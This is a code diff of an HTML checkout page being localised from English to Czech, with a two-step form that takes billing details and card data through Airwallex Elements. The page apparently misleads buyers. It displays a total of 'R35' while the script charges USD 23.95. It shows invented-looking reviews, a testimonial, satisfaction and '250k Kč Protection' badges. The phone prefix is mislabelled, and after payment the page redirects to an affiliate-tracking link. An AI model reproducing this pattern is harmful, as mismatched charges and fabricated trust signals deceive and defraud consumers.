@@ -1,11 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="cs">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Secure Checkout</title>
+  <title>Bezpečná pokladna</title>
   <meta name="referrer" content="no-referrer">
 
+  <!-- ✅ CSP: allow Airwallex + GA + inline scripts/styles + required network calls -->
   <meta http-equiv="Content-Security-Policy"
   content="
     default-src 'self';
@@ -26,6 +27,7 @@
     gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
   </script>
 
+  <!-- Airwallex Elements -->
   <script src="https://checkout.airwallex.com/assets/elements.bundle.min.js"></script>
 
   <style>
@@ -133,16 +135,55 @@
     }
 
     .loading-overlay[aria-hidden="false"]{display:flex;}
+
+    .loading-box{
+      width:min(92vw,460px);
+      background:#fff;
+      border:1px solid #e6edf5;
+      border-radius:14px;
+      padding:24px;
+      text-align:center;
+      box-shadow:0 6px 18px rgba(0,0,0,0.06);
+    }
+
+    .loading-title{
+      font-size:20px;
+      font-weight:800;
+      margin-bottom:18px;
+      color:#2a3b55;
+    }
+
+    .progress-wrap{
+      width:100%;
+      height:12px;
+      background:#ecf1f8;
+      border-radius:999px;
+      overflow:hidden;
+      margin-bottom:14px;
+    }
+
+    .progress-bar{
+      width:0%;
+      height:100%;
+      background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
+      animation:loadingBar 2.2s ease-in-out infinite;
+    }
+
+    @keyframes loadingBar{
+      0%{width:0%}
+      60%{width:80%}
+      100%{width:100%}
+    }
   </style>
 </head>
 
 <body>
-<div class="safe">Secure SSL Payment</div>
+<div class="safe">Secure SSL payment</div>
 
 <div class="wrap">
   <div class="page-title">
-    Secure Checkout 🔒 <span class="stars">★★★★★</span>
-    <span class="reviews">(2,777 reviews)</span>
+    Secure Payment 🔒 <span class="stars">★★★★★</span>
+    <span class="reviews">(2777 reviews)</span>
   </div>
 
   <div class="grid">
@@ -150,100 +191,117 @@
 
       <!-- STEP 1 -->
       <section id="step1" class="step" aria-hidden="false">
-        <div class="h2">1. Information</div>
+        <div class="h2">1. Informace</div>
 
         <div class="form-grid">
-          <div><div class="label">First Name</div><input id="firstName" class="input" placeholder="Jane"></div>
-          <div><div class="label">Last Name</div><input id="lastName" class="input" placeholder="Doe"></div>
+          <div><div class="label">Name</div><input id="firstName" class="input" placeholder="firstName"></div>
+          <div><div class="label">Surname</div><input id="lastName" class="input" placeholder="lastName"></div>
         </div>
 
         <div class="form-grid">
           <div style="grid-column:1 / -1"><div class="label">Address</div><input id="billingStreet" class="input"></div>
-          <div><div class="label">Postal Code</div><input id="billingPostcode" class="input"></div>
+          <div><div class="label">Post Code</div><input id="billingPostcode" class="input"></div>
           <div><div class="label">City</div><input id="billingCity" class="input"></div>
         </div>
 
         <div class="form-grid">
-          <div><div class="label">Email</div><input id="emailInput" class="input" type="email"></div>
+          <div><div class="label">E-mail</div><input id="emailInput" class="input" type="email"></div>
           <div><div class="label">Country</div><input id="billingCountry" class="input" placeholder="South Africa"></div>
         </div>
 
         <div class="form-grid">
           <div>
-            <div class="label">International Code</div>
+            <div class="label">Prefix</div>
             <select id="phonePrefix" class="select">
-              <option value="+27">+27 — South Africa</option>
+              <option value="+420">+27 — South Africa</option>
             </select>
           </div>
-          <div><div class="label">Phone</div><input id="phoneNumber" class="input"></div>
+          <div><div class="label">Phone Number</div><input id="phoneNumber" class="input"></div>
         </div>
 
         <input id="nameInput" class="input" style="display:none">
 
         <button id="nextBtn" class="btn" type="button">Continue</button>
+
+        <div class="logos">
+          <img src="/visa.png"><img src="/mastercard.png"><img src="/amex.png"><img src="/discover.jpg">
+        </div>
       </section>
 
       <!-- STEP 2 -->
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. Payment</div>
-        <p class="sub">Your card details are encrypted and securely processed.</p>
+        <div class="h2">2. Platba</div>
+        <p class="sub">Card details are encrypted and securely processed by our provider.</p>
 
-        <div>
-          <div class="label">Card Number</div>
-          <div id="cardNumber" class="el"></div>
-          <div class="label">Expiry</div>
-          <div id="expiry" class="el"></div>
-          <div class="label">CVC</div>
-          <div id="cvc" class="el"></div>
+        <div class="form-grid-1">
+          <div>
+            <div class="label">Card Number</div>
+            <div id="cardNumber" class="el"></div>
+          </div>
+          <div>
+            <div class="label">Valid Untill</div>
+            <div id="expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="label">CVC</div>
+            <div id="cvc" class="el"></div>
+          </div>
         </div>
 
         <div id="err" class="err" aria-hidden="true"></div>
 
         <div style="display:flex; gap:10px; margin-top:12px">
-          <button id="backBtn" class="btn" style="width:40%" type="button">← Back</button>
-          <button id="payNow" class="btn" style="width:60%" type="button">Pay Securely</button>
+          <button id="backBtn" class="btn muted" style="width:40%" type="button">← Back</button>
+          <button id="payNow" class="btn" style="width:60%" type="button">Pay safely</button>
         </div>
       </section>
 
     </div>
 
+    <!-- RIGHT SIDEBAR -->
     <aside>
       <div class="widget">
-        <div style="text-align:center">What our customers say</div>
+        <div class="w-title" style="text-align:center">What Our Customers Are Saying</div>
         <div style="text-align:center;font-weight:700;">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-        <p style="text-align:center">I received my product yesterday. Great experience!</p>
+        <p class="tiny" style="text-align:center">I received my product yesterday. Great experience!</p>
       </div>
 
       <div class="widget">
         <div class="delivery">
-          <div>
-            <div style="font-weight:800">Fast Delivery</div>
-            <div>3–5 business days</div>
-          </div>
+          <img id="sidebarImg">
+          <div><div style="font-weight:800">Fast delivery</div><div class="tiny">3–5 business days</div></div>
           <div style="margin-left:auto;font-weight:800">Free</div>
         </div>
 
-        <div style="margin-top:14px">Order Summary</div>
-        <div class="order-row"><span>Total</span><span id="orderTotal">ZAR 449.00</span></div>
+        <div class="w-title" style="margin-top:14px">Order Summary</div>
+        <div class="order-row"><span>Total</span><span id="orderTotal">R35</span></div>
       </div>
 
       <div class="widget">
-        <div>TRUSTED STORE</div>
+        <div class="w-title">RELIABLE BUSINESS</div>
         <div class="trust">
-          <div class="box"><div>99%</div><div>Satisfaction</div></div>
-          <div class="box"><div>SSL</div><div>Security</div></div>
-          <div class="box"><div>ZAR 250k</div><div>Protection</div></div>
+          <div class="box"><div class="big">99%</div><div class="small">Satisfaction</div></div>
+          <div class="box"><div class="big">SSL</div><div class="small">Security</div></div>
+          <div class="box"><div class="big">250k Kč</div><div class="small">Protection</div></div>
         </div>
       </div>
     </aside>
   </div>
 </div>
 
+<div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
+  <div class="loading-box">
+    <div class="loading-title">We are processing the payment…</div>
+    <div class="progress-wrap"><div class="progress-bar"></div></div>
+    <p class="sub" style="margin-top:10px">Please wait, this may take a few seconds…</p>
+  </div>
+</div>
+
 <script>
 window.addEventListener('DOMContentLoaded', async () => {
 
-    const step1 = document.getElementById('step1');
+  const step1 = document.getElementById('step1');
   const step2 = document.getElementById('step2');
   const nextBtn = document.getElementById('nextBtn');
   const backBtn = document.getElementById('backBtn');
@@ -253,7 +311,6 @@ window.addEventListener('DOMContentLoaded', async () => {
   const firstName = document.getElementById('firstName');
   const lastName = document.getElementById('lastName');
 
-
   function show(o){ o.setAttribute('aria-hidden','false'); }
   function hide(o){ o.setAttribute('aria-hidden','true'); }
 
@@ -261,107 +318,126 @@ window.addEventListener('DOMContentLoaded', async () => {
     document.getElementById('nameInput').value =
       `${firstName.value} ${lastName.value}`.trim();
     nextBtn.blur();
-    hide(step1);
-    show(step2);
+    hide(step1); show(step2);
   });
 
   backBtn.addEventListener('click', () => {
     backBtn.blur();
-    hide(step2);
-    show(step1);
+    hide(step2); show(step1);
   });
 
-
+  // ================================
+  // ✅ Initialize Airwallex
+  // ================================
   let cardNumber, expiry, cvc;
 
-  await Airwallex.init({ env: "prod", origin: window.location.origin });
+  try {
+    await Airwallex.init({
+      env: "prod",
+      origin: window.location.origin
+    });
 
-  const style = {
-    base: {
-      fontSize: "16px",
-      fontFamily: "Inter, sans-serif",
-      color: "#0a2540"
-    }
-  };
+    const style = {
+      base: {
+        fontSize: "16px",
+        fontFamily: "Inter, sans-serif",
+        color: "#0a2540",
+        "::placeholder": { color: "#5b6b82" }
+      }
+    };
 
-  cardNumber = Airwallex.createElement('cardNumber', { style });
-  expiry = Airwallex.createElement('expiry', { style });
-  cvc = Airwallex.createElement('cvc', { style });
+    cardNumber = Airwallex.createElement('cardNumber', { style });
+    expiry = Airwallex.createElement('expiry', { style });
+    cvc = Airwallex.createElement('cvc', { style });
 
-  cardNumber.mount('cardNumber');
-  expiry.mount('expiry');
-  cvc.mount('cvc');
+    cardNumber.mount('cardNumber');
+    expiry.mount('expiry');
+    cvc.mount('cvc');
+
+  } catch(err) {
+    console.error('Airwallex initialization failed:', err);
+  }
 
   payBtn.addEventListener('click', async () => {
-  payBtn.disabled = true;
-  payBtn.style.opacity = "0.6";
-  errBox.setAttribute("aria-hidden","true");
+    payBtn.disabled = true;
+    payBtn.style.opacity = "0.6";
+    errBox.setAttribute("aria-hidden","true");
 
-  const overlay = document.getElementById('loading-overlay');
-  overlay.style.display = "flex";
-  overlay.setAttribute("aria-hidden","false");
+    const overlay = document.getElementById('loading-overlay');
+    overlay.style.display = "flex";
+    overlay.setAttribute("aria-hidden","false");
 
-  const customer = {
-    first_name: firstName.value,
-    last_name: lastName.value,
-    email: document.getElementById('emailInput').value,
-    phone_number:
-      document.getElementById('phonePrefix').value +
-      document.getElementById('phoneNumber').value,
-    address: {
-      country_code: "ZA",
-      state: document.getElementById('billingCity').value,
-      city: document.getElementById('billingCity').value,
-      street: document.getElementById('billingStreet').value,
-      postcode: document.getElementById('billingPostcode').value
-    }
-  };
-
-  try {
-    const resp = await fetch("/api/airwallex/create-payment-intent", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        amount: 449.00,
-        currency: "ZAR",
-        customer
-      })
-    });
-
-    if (!resp.ok) {
-      const e = await resp.json();
-      throw new Error(e.error || "Payment failed");
-    }
-
-    const data = await resp.json();
-
-    const result = await Airwallex.confirmPaymentIntent({
-      element: cardNumber,
-      id: data.id,
-      client_secret: data.client_secret,
-      payment_method_options: {
-        card: { auto_capture: true }
+    const customer = {
+      first_name: firstName.value,
+      last_name: lastName.value,
+      email: document.getElementById('emailInput').value,
+      phone_number: document.getElementById('phonePrefix').value + document.getElementById('phoneNumber').value,
+      address: {
+        country_code: "CZ",
+        state: document.getElementById('billingCity').value,
+        city: document.getElementById('billingCity').value,
+        street: document.getElementById('billingStreet').value,
+        postcode: document.getElementById('billingPostcode').value
       }
-    });
+    };
 
-    if (result.status === "SUCCEEDED") {
-      window.location.href =
-        "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062";
-      return;
+    try {
+      console.log('Creating payment intent...');
+      
+      const resp = await fetch("/api/airwallex/create-payment-intent", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          amount: 23.95,
+          currency: "USD",
+          customer
+        })
+      });
+
+      if (!resp.ok) {
+        const errorData = await resp.json();
+        throw new Error(errorData.error || 'Backend error');
+      }
+
+      const data = await resp.json();
+      console.log('Payment intent created:', data);
+
+      if (!data.client_secret || !data.id) {
+        throw new Error("Nepodařilo se vytvořit platbu.");
+      }
+
+      console.log('Confirming payment...');
+      
+      const result = await Airwallex.confirmPaymentIntent({
+        element: cardNumber,
+        id: data.id,
+        client_secret: data.client_secret,
+        payment_method_options: {
+          card: {
+            auto_capture: true
+          }
+        }
+      });
+
+      console.log('Payment result:', result);
+
+      if (result.status === "SUCCEEDED") {
+        window.location.href = "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062";
+        return;
+      }
+
+      throw new Error(result.error?.message || "Platba selhala.");
+
+    } catch(err) {
+      console.error('Payment error:', err);
+      errBox.textContent = err.message;
+      errBox.setAttribute("aria-hidden","false");
+      payBtn.disabled = false;
+      payBtn.style.opacity = "1";
+      overlay.style.display = "none";
+      overlay.setAttribute("aria-hidden","true");
     }
-
-    throw new Error(result.error?.message || "Payment failed");
-
-  } catch (err) {
-    errBox.textContent = err.message;
-    errBox.setAttribute("aria-hidden","false");
-    payBtn.disabled = false;
-    payBtn.style.opacity = "1";
-    overlay.style.display = "none";
-    overlay.setAttribute("aria-hidden","true");
-  }
-});
-
+  });
 
 });
 </script>
